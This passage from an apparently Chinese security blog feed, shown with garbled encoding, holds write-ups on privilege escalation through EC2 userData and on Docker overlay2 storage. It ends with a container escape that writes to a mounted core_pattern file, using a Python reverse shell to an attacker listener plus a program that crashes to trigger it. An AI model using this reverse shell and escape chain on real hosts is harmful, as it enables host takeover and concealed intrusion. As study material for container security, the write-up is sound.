<pre><code>aws ec2 modify-instance-attribute --instance-id=i-0d9a8dae1fb451cff --attribute userData --value file://userdata.b64.txt
</code></pre>
<p>å¯åŠ¨å®ä¾‹</p>
<pre><code>aws ec2 start-instances --instance-id i-0d9a8dae1fb451cff
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720011738806-dc79a222-8c97-4a69-ac31-127f2f7e2b64.png" alt="image.png" loading="lazy"></figure>
<p>sshè¿ä¸Šååœ¨ç”¨æˆ·ç›®å½•ä¸‹å‡ºç°äº†æˆ‘ä»¬å¤åˆ¶çš„suidï¼Œæ‰§è¡Œ<code>./suid -p</code>å½“å‰shellæƒé™å˜æˆroot<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012083978-75f86c30-542e-4d6f-80c9-43634ff5fe87.png" alt="image.png" loading="lazy"></p>
<p>æŸ¥çœ‹outputæ–‡ä»¶å¯ä»¥å¾—çŸ¥userdataæ˜¯ä»¥rootæƒé™æ‰§è¡Œçš„<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012503404-e58e79be-a31f-45c9-98a3-a34c0d6add1b.png" alt="image.png" loading="lazy"></p>
<p><code>cloud-config.txt</code>è¢«å¤åˆ¶åˆ°<code>/var/lib/cloud/instance/</code>ç›®å½•ä¸‹<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012510953-ef6bcc91-d20f-46bd-a1b8-12603f936da3.png" alt="image.png" loading="lazy"></p>
<p><code>userdata.txt</code>è¢«å¤åˆ¶åˆ°<code>/var/lib/cloud/instance/scripts/</code>ç›®å½•ä¸‹<br>
<img src="https://skyblu3519.github.io/post-images/Ec2UserData/1720012515086-422cc7e2-9230-4f5a-885c-ef73278f85fd.png" alt="image.png" loading="lazy"></p>
<h1 id="å‚è€ƒé“¾æ¥">å‚è€ƒé“¾æ¥</h1>
<p><a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instancedata-data-categories.html">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/instancedata-data-categories.html</a><br>
<a href="https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/user-data.html%5D">https://docs.aws.amazon.com/zh_cn/AWSEC2/latest/UserGuide/user-data.html</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Dockerå®¹å™¨å®‰å…¨3]Dockeræ–‡ä»¶å­˜å‚¨ & æŒ‚è½½å®¿ä¸»æœº procfs å®¹å™¨é€ƒé€¸]]></title>
        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi/</id>
        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-3docker-wen-jian-cun-chu-and-gua-zai-su-zhu-ji-procfs-rong-qi-tao-yi/">
        </link>
        <updated>2024-05-11T15:35:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="dockeræ–‡ä»¶å­˜å‚¨èƒŒæ™¯çŸ¥è¯†">Dockeræ–‡ä»¶å­˜å‚¨èƒŒæ™¯çŸ¥è¯†</h1>
<h2 id="docker-é•œåƒ">Docker é•œåƒ</h2>
<p>Docker é•œåƒæ˜¯ä¸€ä¸ªç”±å¤šä¸ªå±‚ï¼ˆlayersï¼‰ç»„æˆçš„åªè¯»æ¨¡æ¿ã€‚è¿™äº›å±‚å †å åœ¨ä¸€èµ·ï¼Œæ„æˆäº†ä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿï¼Œé•œåƒå¯ä»¥ç”¨æ¥åˆ›å»ºå®¹å™¨ã€‚</p>
<h2 id="å±‚layer">å±‚ï¼ˆLayerï¼‰</h2>
<p>æ¯ä¸ªå±‚é€šå¸¸å¯¹åº”äº Dockerfile ä¸­çš„ä¸€æ¡æŒ‡ä»¤ï¼ˆå¦‚ FROMã€COPYã€RUN ç­‰ï¼‰ã€‚è¿™äº›å±‚æ˜¯åªè¯»çš„ï¼Œå¹¶ä¸”é€šè¿‡å åŠ æŠ€æœ¯ï¼ˆunion file systemï¼‰ç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆäº†é•œåƒçš„æœ€ç»ˆå†…å®¹ã€‚</p>
<h2 id="å±‚çš„å †å å’Œé•œåƒ">å±‚çš„å †å å’Œé•œåƒ</h2>
<ul>
<li>åªè¯»å±‚ï¼šè¿™äº›å±‚æ˜¯åªè¯»çš„ï¼Œå¹¶ä¸”æ˜¯é•œåƒçš„ä¸€éƒ¨åˆ†ã€‚æ¯ä¸ªå±‚åŒ…å«äº†ä¸å‰ä¸€å±‚çš„å·®å¼‚éƒ¨åˆ†ã€‚è¿™äº›å±‚å…±åŒæ„æˆäº†é•œåƒçš„æ–‡ä»¶ç³»ç»Ÿã€‚</li>
<li>å¯å†™å±‚ï¼šå½“å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¼šåœ¨é•œåƒçš„æ‰€æœ‰åªè¯»å±‚ä¹‹ä¸Šæ·»åŠ ä¸€ä¸ªæ–°çš„å¯å†™å±‚ï¼Œè¿™ä¸€å±‚æ˜¯å®¹å™¨ä¸“æœ‰çš„ï¼Œå­˜å‚¨è¿è¡Œå®¹å™¨æ—¶çš„æ‰€æœ‰å˜æ›´ã€‚</li>
<li>æ¯ä¸ªå®¹å™¨éƒ½æœ‰å…¶è‡ªå·±çš„å¯å†™å®¹å™¨å±‚ï¼Œå¹¶ä¸”æ‰€æœ‰æ›´æ”¹éƒ½å­˜å‚¨åœ¨è¯¥å®¹å™¨å±‚ä¸­ï¼Œæ‰€ä»¥å¤šä¸ªå®¹å™¨å¯ä»¥å…±äº«å¯¹åŒä¸€åŸºç¡€æ˜ åƒçš„è®¿é—®ï¼Œä½†å…·æœ‰è‡ªå·±çš„æ•°æ®çŠ¶æ€ã€‚ä¸‹</li>
</ul>
<p><img src="https://skyblu3519.github.io/post-images/1715441777002.png" alt="" loading="lazy"><br>
<img src="https://skyblu3519.github.io/post-images/1715441784258.png" alt="" loading="lazy"></p>
<h2 id="å†™æ—¶å¤åˆ¶copy-on-write-cowæœºåˆ¶">å†™æ—¶å¤åˆ¶ï¼ˆCopy-on-Write, CoWï¼‰æœºåˆ¶</h2>
<p>å½“å®¹å™¨ä¸­çš„æ–‡ä»¶è¢«ä¿®æ”¹æ—¶ï¼Œå­˜å‚¨é©±åŠ¨ç¨‹åºä¼šæ‰§è¡Œå†™æ—¶å¤åˆ¶æ“ä½œï¼Œä»¥ç¡®ä¿åªè¯»å±‚ä¸è¢«ä¿®æ”¹ï¼Œå¹¶å°†æ›´æ”¹å†™å…¥åˆ°å¯å†™å±‚ä¸­ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li>æŸ¥æ‰¾æ–‡ä»¶ï¼šå½“éœ€è¦ä¿®æ”¹ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œå­˜å‚¨é©±åŠ¨ç¨‹åºé¦–å…ˆä¼šåœ¨é•œåƒå±‚ä¸­æœç´¢è¯¥æ–‡ä»¶ã€‚è¿™ä¸ªè¿‡ç¨‹ä»æœ€æ–°çš„é•œåƒå±‚å¼€å§‹ï¼Œä¸€å±‚ä¸€å±‚å‘ä¸‹æœç´¢ï¼Œç›´åˆ°æ‰¾åˆ°æ–‡ä»¶ä¸ºæ­¢ã€‚</li>
<li>Copy-upæ“ä½œï¼šä¸€æ—¦æ‰¾åˆ°æ–‡ä»¶ï¼Œå­˜å‚¨é©±åŠ¨ç¨‹åºä¼šå°†è¯¥æ–‡ä»¶çš„å‰¯æœ¬å¤åˆ¶åˆ°å¯å†™å®¹å™¨å±‚ä¸­ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºâ€œcopy-upâ€æ“ä½œã€‚</li>
<li>ä¿®æ”¹æ–‡ä»¶ï¼šæ–‡ä»¶è¢«å¤åˆ¶åˆ°å¯å†™å±‚åï¼Œæ‰€æœ‰å¯¹è¯¥æ–‡ä»¶çš„ä¿®æ”¹éƒ½ä¼šåœ¨å¯å†™å±‚ä¸­è¿›è¡Œã€‚å®¹å™¨ä¸­çš„è¿›ç¨‹å°†åªèƒ½çœ‹åˆ°å¯å†™å±‚ä¸­çš„ä¿®æ”¹åçš„æ–‡ä»¶ï¼Œè€Œä¸ä¼šå†è®¿é—®åªè¯»å±‚ä¸­çš„åŸå§‹æ–‡ä»¶ã€‚</li>
</ol>
<p>ä¸åŒçš„å­˜å‚¨é©±åŠ¨ç¨‹åºï¼ˆå¦‚ AUFSã€OverlayFSã€Overlay2ï¼‰å¤„ç†å†™æ—¶å¤åˆ¶æ“ä½œçš„å…·ä½“æ–¹å¼å¯èƒ½æœ‰æ‰€ä¸åŒï¼ŒOverlayFSæ˜¯æ¨èçš„å­˜å‚¨é©±åŠ¨ç¨‹åºã€‚</p>
<h2 id="overlay2å­˜å‚¨é©±åŠ¨">Overlay2å­˜å‚¨é©±åŠ¨</h2>
<p>OverlayFS æ˜¯ Linux å†…æ ¸ä¸­ä¸€ç§è”åˆæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒå…è®¸å°†å¤šä¸ªç›®å½•åˆå¹¶ä¸ºä¸€ä¸ªé€»è¾‘ä¸Šçš„å•ä¸€ç›®å½•ç»“æ„ã€‚å…¶æ ¸å¿ƒæ¦‚å¿µæ˜¯é€šè¿‡å°†å¤šä¸ªå±‚ï¼ˆé€šå¸¸æ˜¯åªè¯»å±‚å’Œä¸€ä¸ªå¯å†™å±‚ï¼‰åˆå¹¶ï¼Œæä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ–‡ä»¶ç³»ç»Ÿè§†å›¾ã€‚</p>
<h3 id="ä¸»è¦æ¦‚å¿µ">ä¸»è¦æ¦‚å¿µ</h3>
<ul>
<li>lowerdirï¼šåªè¯»å±‚ï¼ŒåŒ…å«åŸºç¡€æ–‡ä»¶ç³»ç»Ÿã€‚</li>
<li>upperdirï¼šå¯å†™å±‚ï¼Œè®°å½•æ‰€æœ‰çš„å†™æ“ä½œã€‚</li>
<li>workdirï¼šå·¥ä½œç›®å½•ï¼ŒOverlayFS æ“ä½œæ‰€éœ€çš„ä¸´æ—¶å­˜å‚¨ã€‚</li>
</ul>
<p>overlay å’Œ overlay2 æ˜¯ Docker ä¸­åŸºäº OverlayFS çš„ä¸¤ç§å­˜å‚¨é©±åŠ¨ç¨‹åºã€‚</p>
<h3 id="overlay">overlay</h3>
<ul>
<li>overlay æ˜¯æœ€æ—©çš„åŸºäº OverlayFS çš„å­˜å‚¨é©±åŠ¨ç¨‹åºã€‚</li>
<li>å®ƒæ”¯æŒç®€å•çš„ä¸¤å±‚ç»“æ„ï¼ˆä¸€ä¸ª lowerdir å’Œä¸€ä¸ª upperdirï¼‰ã€‚</li>
<li>å¯¹äºè¾ƒå¤§çš„é•œåƒå’Œå¤§é‡å±‚çš„åœºæ™¯ï¼Œæ€§èƒ½å’Œå¯æ‰©å±•æ€§æ–¹é¢æœ‰ä¸€å®šçš„å±€é™æ€§ã€‚</li>
</ul>
<h3 id="overlay2">overlay2</h3>
<ul>
<li>overlay2 æ˜¯æ”¹è¿›åçš„å­˜å‚¨é©±åŠ¨ç¨‹åºï¼Œå…‹æœäº† overlay çš„ä¸€äº›å±€é™æ€§ã€‚</li>
<li>æ”¯æŒå¤šå±‚ç»“æ„ï¼ˆmultiple lowerdirsï¼‰ï¼Œå³å¯ä»¥å°†å¤šä¸ªåªè¯»å±‚ï¼ˆlowerdirï¼‰å åŠ èµ·æ¥ï¼Œè¿›ä¸€æ­¥æé«˜äº†çµæ´»æ€§å’Œå¯æ‰©å±•æ€§ã€‚</li>
<li>åœ¨æ€§èƒ½å’Œç¨³å®šæ€§æ–¹é¢éƒ½æœ‰æ‰€æå‡ï¼Œé€‚åˆå¤„ç†æ›´å¤æ‚çš„é•œåƒå’Œå±‚æ¬¡ç»“æ„ã€‚</li>
</ul>
<h3 id="æµ‹è¯•">æµ‹è¯•</h3>
<p>ä½¿ç”¨<code>docker info</code>æŸ¥çœ‹dockerä½¿ç”¨çš„æ–‡ä»¶é©±åŠ¨</p>
<pre><code># docker info | grep &quot;Storage Driver&quot;
...
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Using metacopy: false
  Native Overlay Diff: true
  userxattr: false
...
</code></pre>
<p>æ‹‰å–ä¸€ä¸ªubuntu:20.04é•œåƒï¼š</p>
<pre><code># docker pull ubuntu:20.04
20.04: Pulling from library/ubuntu
d4c3c94e5e10: Pull complete
Digest: sha256:874aca52f79ae5f8258faff03e10ce99ae836f6e7d2df6ecd3da5c1cad3a912b
Status: Downloaded newer image for ubuntu:20.04
docker.io/library/ubuntu:20.04
</code></pre>
<p>é•œåƒæ‹‰å–äº†ä¸€å±‚ï¼ŒæŸ¥çœ‹ overlay2 çš„ç›®å½•ï¼š</p>
<pre><code># ls -l /var/lib/docker/overlay2/
total 8
drwx--x--- 3 root root 4096 May 11 18:38 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
drwx------ 2 root root 4096 May 11 18:38 l
</code></pre>
<p>overlay2 ç›®å½•ä¸‹å‡ºç°äº†ä¸€ä¸ªé•œåƒå±‚ç›®å½•å’Œä¸€ä¸ª<code>l</code>ç›®å½•ï¼Œé¦–å…ˆæ¥æŸ¥çœ‹ä¸€ä¸‹<code>l</code>ç›®å½•çš„å†…å®¹ï¼š</p>
<pre><code># ls -l /var/lib/docker/overlay2/l
total 4
lrwxrwxrwx 1 root root 72 May 11 18:38 DT325SQS52JQUKKHRELWLMM64Z -&gt; ../105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff
</code></pre>
<p>å¯ä»¥çœ‹åˆ°lç›®å½•æ˜¯ä¸€å †è½¯è¿æ¥ï¼ŒæŠŠä¸€äº›è¾ƒçŸ­çš„éšæœºä¸²è½¯è¿åˆ°é•œåƒå±‚çš„ diff æ–‡ä»¶å¤¹ä¸‹ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†é¿å…è¾¾åˆ°mountå‘½ä»¤å‚æ•°çš„é•¿åº¦é™åˆ¶ã€‚</p>
<p>å†çœ‹ä¸‹è¿™ä¸ªé•œåƒå±‚ä¸­çš„å†…å®¹ï¼š</p>
<pre><code># ls -l /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/
total 8
drwxr-xr-x 17 root root 4096 May 11 18:39 diff
-rw-r--r--  1 root root   26 May 11 18:38 link
</code></pre>
<p>è¿™é‡ŒåŒ…å« diffç›®å½• å’Œ linkæ–‡ä»¶ï¼š</p>
<ul>
<li>diffç›®å½•ï¼šåŒ…å«äº†è¯¥å±‚çš„æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•å†…å®¹ã€‚è¿™æ˜¯ä¸€ä¸ªå¯å†™å±‚ï¼Œå­˜å‚¨äº†åœ¨è¯¥å±‚ä¸­æ‰€åšçš„æ‰€æœ‰æ›´æ”¹ã€‚<br>
<img src="https://skyblu3519.github.io/post-images/1715442172976.png" alt="" loading="lazy"></li>
<li>linkæ–‡ä»¶ï¼šå†…å®¹ä¸ºè¯¥é•œåƒå±‚çš„çŸ­ ID</li>
</ul>
<pre><code># cat /var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/link
DT325SQS52JQUKKHRELWLMM64Z
</code></pre>
<p>åœ¨ Docker é•œåƒæˆ–å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯ä¸­ï¼Œ<code>GraphDriver</code> éƒ¨åˆ†æä¾›äº†å…³äºå­˜å‚¨é©±åŠ¨ç¨‹åºçš„å…·ä½“ä¿¡æ¯ã€‚</p>
<pre><code># docker inspect ubuntu:20.04

......çœç•¥éƒ¨åˆ†
&quot;GraphDriver&quot;: {
    &quot;Data&quot;: {
        &quot;MergedDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/merged&quot;,
        &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/diff&quot;,
        &quot;WorkDir&quot;: &quot;/var/lib/docker/overlay2/105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6/work&quot;
    },
    &quot;Name&quot;: &quot;overlay2&quot;
},
......
</code></pre>
<p>å­—æ®µè§£é‡Šï¼š</p>
<ul>
<li>Name: æŒ‡å®šå­˜å‚¨é©±åŠ¨ç¨‹åºçš„åç§°ã€‚è¿™é‡Œé¢ï¼Œå­˜å‚¨é©±åŠ¨ç¨‹åºä¸º overlay2ã€‚</li>
<li>Data: åŒ…å«ä¸ overlay2 å­˜å‚¨é©±åŠ¨ç¨‹åºç›¸å…³çš„å…·ä½“ç›®å½•ä¿¡æ¯ã€‚
<ul>
<li>MergedDir: æŒ‡å‘åˆå¹¶ç›®å½•ï¼Œè¯¥ç›®å½•æä¾›äº†å®¹å™¨è¿è¡Œæ—¶çš„ç»Ÿä¸€è§†å›¾ã€‚å½“å®¹å™¨è¿è¡Œæ—¶ï¼ŒMergedDir æ˜¯å®é™…æŒ‚è½½ç‚¹ï¼Œå®ƒå°†å¤šä¸ªåªè¯»å±‚å’Œä¸€ä¸ªå¯å†™å±‚åˆå¹¶åœ¨ä¸€èµ·ï¼Œæä¾›ä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿè§†å›¾ã€‚</li>
<li>UpperDir: æŒ‡å‘ä¸Šå±‚ç›®å½•ï¼Œè¯¥ç›®å½•åŒ…å«å¯å†™å±‚çš„å†…å®¹ã€‚å½“å®¹å™¨å¯¹æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œå†™æ“ä½œæ—¶ï¼Œä¿®æ”¹ä¼šå†™å…¥ UpperDirã€‚è¿™æ˜¯å†™æ—¶å¤åˆ¶ï¼ˆCopy-on-Writeï¼‰æœºåˆ¶çš„ä¸€éƒ¨åˆ†ã€‚</li>
<li>WorkDir: æŒ‡å‘å·¥ä½œç›®å½•ï¼Œè¯¥ç›®å½•ç”¨äº OverlayFS çš„ä¸´æ—¶å­˜å‚¨æ“ä½œã€‚WorkDir æ˜¯ OverlayFS æ‰€éœ€çš„ï¼Œæ”¯æŒæ–‡ä»¶ç³»ç»Ÿæ“ä½œå¦‚åˆ›å»ºå’Œåˆ é™¤æ–‡ä»¶æ—¶çš„ä¸´æ—¶å­˜å‚¨ã€‚</li>
</ul>
</li>
</ul>
<p>å¯åŠ¨å®¹å™¨</p>
<pre><code>docker run -d --name=ubt ubuntu: 20.04 tail -f /dev/null
</code></pre>
<p><code>/var/lib/docker/overlay2/</code>å¤šäº†ä¸ªè¡¨ç¤ºå®¹å™¨å±‚çš„ç›®å½•</p>
<pre><code># ls -l /var/lib/docker/overlay2/
total 12
drwx--x--- 3 root root 4096 May 11 21:44 105a8e521d837d13118b9aae453cea7193bca3a8bb9e65a7db5c6ff5ab6b3aa6
drwx--x--- 5 root root 4096 May 11 21:44 76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
drwx------ 2 root root 4096 May 11 21:44 l
</code></pre>
<p>æŸ¥çœ‹å®¹å™¨å±‚ç›®å½•å†…å®¹</p>
<pre><code># ls -l /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8
total 20
drwxr-xr-x 2 root root 4096 May 11 21:44 diff
-rw-r--r-- 1 root root   26 May 11 21:44 link
-rw-r--r-- 1 root root   57 May 11 21:44 lower
drwxr-xr-x 1 root root 4096 May 11 21:44 merged
drwx------ 3 root root 4096 May 11 21:44 work
</code></pre>
<p>æ–‡ä»¶è§£é‡Šï¼š</p>
<ul>
<li>loweræ–‡ä»¶ï¼šè¯¥å±‚ä¾èµ–çš„æ‰€æœ‰ä¸‹å±‚çš„ç›®å½•è·¯å¾„ã€‚<code>l</code>ç›®å½•ä¸‹çš„çŸ­é“¾æ¥</li>
<li>mergedç›®å½•ï¼šæä¾›å®¹å™¨çš„åˆå¹¶æ–‡ä»¶ç³»ç»Ÿè§†å›¾ã€‚æ‰€æœ‰å¯¹æ–‡ä»¶ç³»ç»Ÿçš„è®¿é—®éƒ½ä¼šé€šè¿‡è¿™ä¸ªåˆå¹¶è§†å›¾ã€‚</li>
<li>work ç›®å½•: ç”¨äº OverlayFS æ“ä½œçš„ä¸´æ—¶å­˜å‚¨ã€‚</li>
</ul>
<p>åœ¨å®¹å™¨ä¸­å†™å…¥ä¸€ä¸ªæ–‡ä»¶<code>/home/test</code>ï¼Œå®ƒä¼šå‡ºç°åœ¨<code>diff</code>å’Œ<code>merged</code>ç›®å½•ä¸­</p>
<pre><code># tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/diff/
â”œâ”€â”€ home
â”‚Â Â  â””â”€â”€ test
â””â”€â”€ root


# tree /var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
/var/lib/docker/overlay2/76eab2335162f96c85ba40be7c5a0ab8fca48e76889c6d5e7474c9332b495fe8/merged/home/
â””â”€â”€ test
</code></pre>
<h1 id="æŒ‚è½½å®¿ä¸»æœº-procfs-é€ƒé€¸">æŒ‚è½½å®¿ä¸»æœº procfs é€ƒé€¸</h1>
<h2 id="èƒŒæ™¯">èƒŒæ™¯</h2>
<p><code>/proc/sys/kernel/core_pattern</code>æ–‡ä»¶ç”¨äºé…ç½®ç”Ÿæˆè¿›ç¨‹æ ¸å¿ƒè½¬å‚¨ï¼ˆcore dumpï¼‰æ–‡ä»¶çš„æ¨¡å¼ï¼Œå…¶å†…å®¹å®šä¹‰äº†æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶çš„å‘½åæ¨¡å¼å’Œå­˜å‚¨ä½ç½®ã€‚å½“ä¸€ä¸ªç¨‹åºå´©æºƒæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šç”Ÿæˆä¸€ä¸ªæ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«è¿›ç¨‹çš„å†…å­˜å¿«ç…§ã€å¯„å­˜å™¨çŠ¶æ€ç­‰ä¿¡æ¯ã€‚</p>
<p>ä» 2.6.19 å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼ŒLinux æ”¯æŒåœ¨ <code>/proc/sys/kernel/core_pattern</code> ä¸­ä½¿ç”¨æ–°è¯­æ³•ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„é¦–ä¸ªå­—ç¬¦æ˜¯ç®¡é“ç¬¦<code>|</code>ï¼Œé‚£ä¹ˆè¯¥è¡Œçš„å‰©ä½™å†…å®¹å°†è¢«å½“ä½œç”¨æˆ·ç©ºé—´ç¨‹åºæˆ–è„šæœ¬è§£é‡Šå¹¶æ‰§è¡Œã€‚</p>
<pre><code class="language-shell">|/usr/local/bin/core_handler %p %u %g %s %t %h %e
</code></pre>
<p>è¿™æ ·ï¼Œå½“ä¸€ä¸ªç¨‹åºå´©æºƒæ—¶ï¼Œæ ¸å¿ƒè½¬å‚¨ä¿¡æ¯ä¼šè¢«ä¼ é€’ç»™ <code>/usr/local/bin/core_handler</code> è„šæœ¬è¿›è¡Œå¤„ç†ã€‚å…¶ä¸­å ä½ç¬¦çš„è§£é‡Šï¼š</p>
<ul>
<li><code>%p</code>ï¼šè¿›ç¨‹ ID</li>
<li><code>%u</code>ï¼šç”¨æˆ· ID</li>
<li><code>%g</code>ï¼šç»„ ID</li>
<li><code>%s</code>ï¼šè¿›ç¨‹çš„ä¿¡å·å·</li>
<li><code>%t</code>ï¼šæ—¶é—´æˆ³</li>
<li><code>%h</code>ï¼šä¸»æœºå</li>
<li><code>%e</code>ï¼šå¯æ‰§è¡Œæ–‡ä»¶å</li>
</ul>
<h2 id="æ”»å‡»æ€è·¯">æ”»å‡»æ€è·¯</h2>
<p>æ‰€ä»¥è¿™ä¸ªçš„åŸç†å°±æ˜¯å½“<code>/proc/sys/kernel/core_pattern</code>è¢«æŒ‚è½½åˆ°å®¹å™¨ä¸­æ—¶ï¼Œå¯ä»¥åœ¨å®¹å™¨ä¸­å†™ä¸€ä¸ªæ¶æ„è„šæœ¬ï¼Œæ ¹æ®å‰é¢çš„çŸ¥è¯†è¿™ä¸ªè„šæœ¬åœ¨çœŸå®ä¸»æœºä¸­çš„ä½ç½®æ˜¯å¯ä»¥æ‰¾åˆ°çš„ã€‚ç„¶åç¼–è¾‘<code>/proc/sys/kernel/core_pattern</code>ä½¿ç”¨ç®¡é“ç¬¦æŒ‡å‘è¯¥è„šæœ¬ï¼Œå†å†™ä¸€ä¸ªå¯ä»¥ä½¿è¿›ç¨‹å´©æºƒçš„è„šæœ¬è§¦å‘ï¼Œè®©ç‰©ç†æ‰§è¡Œè¿™ä¸ªè„šæœ¬ï¼Œè¿›è€Œè·å¾—ç‰©ç†æœºçš„shellå®ç°å®¹å™¨é€ƒé€¸ã€‚</p>
<h2 id="å®éªŒ">å®éªŒ</h2>
<p>åˆ›å»ºä¸€ä¸ªå®¹å™¨å¹¶æŒ‚è½½ <code>/proc</code> ç›®å½•</p>
<pre><code class="language-shell">docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
</code></pre>
<p>å¦‚æœæ‰¾åˆ°ä¸¤ä¸ª <code>core_pattern</code> æ–‡ä»¶ï¼Œé‚£å¯èƒ½å°±æ˜¯æŒ‚è½½äº†å®¿ä¸»æœºçš„ procfs</p>
<pre><code class="language-shell">find / -name core_pattern
</code></pre>
<p>æŸ¥çœ‹å®¹å™¨çš„æŒ‚è½½è·¯å¾„</p>
<pre><code class="language-shell">mount | grep overlay
</code></pre>
<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1715442187875.png" alt="" loading="lazy"></figure>
<p>ä»è¿”å›å¯ä»¥çŸ¥é“ï¼Œå†™æ–‡ä»¶åœ¨ç‰©ç†æœºçš„è·¯å¾„ä¸º</p>
<pre><code class="language-shell">/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/diff
/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged
</code></pre>
<p>å®‰è£… vim å’Œ gcc</p>
<pre><code class="language-shell">apt-get update -y &amp;&amp; apt-get install vim gcc -y
</code></pre>
<p>åˆ›å»ºä¸€ä¸ªåå¼¹ Shell çš„ py è„šæœ¬<code>/tmp/.t.py</code></p>
<pre><code class="language-python">#!/usr/bin/python3
import  os
import pty
import socket
lhost = &quot;IP&quot;
lport = 9999
def main():
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((lhost, lport))
   os.dup2(s.fileno(), 0)
   os.dup2(s.fileno(), 1)
   os.dup2(s.fileno(), 2)
   os.putenv(&quot;HISTFILE&quot;, '/dev/null')
   pty.spawn(&quot;/bin/bash&quot;)
   # os.remove('/tmp/.t.py')
   s.close()
if __name__ == &quot;__main__&quot;:
   main()
</code></pre>
<p>ç»™ Shell èµ‹äºˆæ‰§è¡Œæƒé™</p>
<pre><code class="language-python">chmod 777 /tmp/t.py
</code></pre>
<p>å†™å…¥åå¼¹ shell åˆ°ç›®æ ‡çš„ proc ç›®å½•ä¸‹</p>
<pre><code class="language-python">echo -e &quot;|/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged/tmp/t.py \rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern
</code></pre>
<p>åœ¨æ”»å‡»ä¸»æœºä¸Šå¼€å¯ä¸€ä¸ªç›‘å¬ï¼Œç„¶ååœ¨å®¹å™¨é‡Œè¿è¡Œä¸€ä¸ªå¯ä»¥å´©æºƒçš„ç¨‹åº</p>
<pre><code class="language-c">vim t.c
#include&lt;stdio.h&gt;
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
gcc t.c -o t
./t
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Dockerå®¹å™¨å®‰å…¨2]Linux Capabilities & ç‰¹æƒæ¨¡å¼å®¹å™¨é€ƒé€¸]]></title>
        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-2linux-capabilities-and-te-quan-mo-shi-rong-qi-tao-yi/</id>
        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-2linux-capabilities-and-te-quan-mo-shi-rong-qi-tao-yi/">
        </link>
        <updated>2024-05-10T13:47:38.000Z</updated>
        <content type="html"><![CDATA[<h1 id="ç¬”è®°">ç¬”è®°</h1>
<p>å­¦ä¹ ä¸‹Linux capabilities</p>
<h2 id="æ¦‚å¿µ">æ¦‚å¿µ</h2>
<p>Linux capabilities å°† root æƒé™åˆ’åˆ†ä¸ºè¾ƒå°çš„ã€ç‹¬ç«‹çš„å•å…ƒï¼Œä½¿è¿›ç¨‹å¯ä»¥æ‹¥æœ‰éƒ¨åˆ†æƒé™ï¼Œä»¥å¯¹ root æƒé™è¿›è¡Œæ›´ç»†ç²’åº¦çš„æ§åˆ¶ã€‚</p>
